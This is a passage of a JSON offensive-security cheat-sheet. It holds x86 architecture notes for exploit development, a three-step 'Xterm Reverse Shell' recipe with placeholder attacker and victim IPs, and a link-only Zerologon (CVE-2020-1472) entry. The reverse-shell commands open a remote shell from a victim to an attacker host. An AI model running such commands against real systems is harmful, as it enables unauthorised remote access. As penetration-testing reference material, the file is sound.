            "content": "Windows processes have a virtual memory layout with distinct regions:\n- **Code Segment (.text)**: Contains executable instructions, typically read-only\n- **Data Segment (.data)**: Initialized global and static variables\n- **BSS Segment (.bss)**: Uninitialized global and static variables\n- **Heap**: Dynamically allocated memory, grows toward higher addresses\n- **Stack**: Local variables and function call data, grows toward lower addresses",
            "variant": "info"
          }
        ]
      },
      {
        "title": "The Stack [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Stack operations\npush eax        ; ESP = ESP - 4; [ESP] = EAX\npop ebx         ; EBX = [ESP]; ESP = ESP + 4"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The stack is a LIFO (Last In, First Out) data structure used for function calls, local variables, and control flow:\n- **Stack Growth**: On x86, the stack grows from high addresses to low addresses\n- **PUSH Operation**: Decrements ESP, then writes value to [ESP]\n- **POP Operation**: Reads value from [ESP], then increments ESP",
            "variant": "info"
          }
        ]
      },
      {
        "title": "CPU Registers [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "x86 has eight 32-bit general purpose registers plus special registers for control flow:\n- **EAX**: Accumulator, used for arithmetic and return values\n- **EBX**: Base register, general purpose\n- **ECX**: Counter register, used for loops\n- **EDX**: Data register, used for I/O and arithmetic\n- **ESI**: Source Index, used for string operations\n- **EDI**: Destination Index, used for string operations\n- **EBP**: Base Pointer, points to current stack frame base\n- **ESP**: Stack Pointer, points to top of stack\n- **EIP**: Instruction Pointer, address of next instruction to execute",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Register Subdivisions [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "|-------- EAX (32-bit) --------|\n              |-- AX (16-bit) --|\n              | AH   |   AL    |"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "32-bit registers can be accessed as smaller portions."
          },
          {
            "type": "note",
            "content": "**EAX** (32-bit) contains **AX** (16-bit lower), which contains **AH** (8-bit high) and **AL** (8-bit low)."
          }
        ]
      },
      {
        "title": "Calling Conventions [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Calling function(1, 2, 3) in cdecl\npush 3          ; Third argument\npush 2          ; Second argument\npush 1          ; First argument\ncall function\nadd esp, 12     ; Caller cleans up (3 args * 4 bytes)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**cdecl** (C declaration) is the default for C programs on x86:\n- **Arguments**: Pushed onto stack right-to-left\n- **Return Value**: Stored in EAX\n- **Stack Cleanup**: Caller is responsible for cleaning the stack\n- **Preserved Registers**: EBX, ESI, EDI, EBP must be preserved by callee",
            "variant": "info"
          }
        ]
      },
      {
        "title": "stdcall Convention [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Calling WinAPI function\npush arg3\npush arg2\npush arg1\ncall WinAPIFunction  ; Callee cleans stack with RET n"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Used by Windows API functions."
          },
          {
            "type": "note",
            "content": "**Arguments**: Pushed right-to-left (same as cdecl).\n**Stack Cleanup**: Callee cleans the stack before returning."
          }
        ]
      },
      {
        "title": "Stack Frame Layout [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "High Address\n+------------------+\n|   Argument N     |  [EBP + 8 + (N-1)*4]\n+------------------+\n|   Argument 2     |  [EBP + 12]\n+------------------+\n|   Argument 1     |  [EBP + 8]\n+------------------+\n|  Return Address  |  [EBP + 4]\n+------------------+\n|    Saved EBP     |  [EBP]\n+------------------+\n|  Local Var 1     |  [EBP - 4]\n+------------------+\n|  Local Var 2     |  [EBP - 8]\n+------------------+\nLow Address (ESP)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "When a function is called, a stack frame is created."
          }
        ]
      },
      {
        "title": "Function Prologue and Epilogue [Knowledge]",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Prologue - function entry\npush ebp          ; Save caller's base pointer\nmov ebp, esp      ; Set up new base pointer\nsub esp, N        ; Allocate space for local variables\n\n; ... function body ...\n\n; Epilogue - function exit\nmov esp, ebp      ; Deallocate local variables\npop ebp           ; Restore caller's base pointer\nret               ; Return to caller"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Standard function setup and teardown."
          }
        ]
      },
      {
        "title": "EFLAGS Register [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Contains status and control flags:\n- **ZF (Zero Flag)**: Set if result is zero\n- **SF (Sign Flag)**: Set if result is negative\n- **CF (Carry Flag)**: Set if unsigned overflow occurred\n- **OF (Overflow Flag)**: Set if signed overflow occurred",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Intel x86 Manual",
        "url": "https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Understanding x86 architecture is essential for exploit development. Key concepts include memory layout, CPU registers, and calling conventions."
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Xterm Reverse Shell",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Start Listener on Attacker",
        "codes": [
          {
            "lang": "bash",
            "code": "xnest :1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Listens on port 6001."
          }
        ]
      },
      {
        "title": "Add Permission to Connect",
        "codes": [
          {
            "lang": "bash",
            "code": "xhost +<VictimIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Connect from Victim",
        "codes": [
          {
            "lang": "bash",
            "code": "xterm -display <AttackerIP>:1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Zerologon",
    "title": "Zerologon (CVE-2020-1472)",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [],
    "resources": [
      {
        "text": "Zerologon Explained",
        "url": "https://www.secura.com/blog/zero-logon"
      },
      {
        "text": "Microsoft Advisory",
        "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"
      },
      {
        "text": "HackTricks Zerologon",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/zerologon"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Critical vulnerability in Windows Netlogon that allows attackers to take over domain controllers without authentication."
      }
    ]
  }
]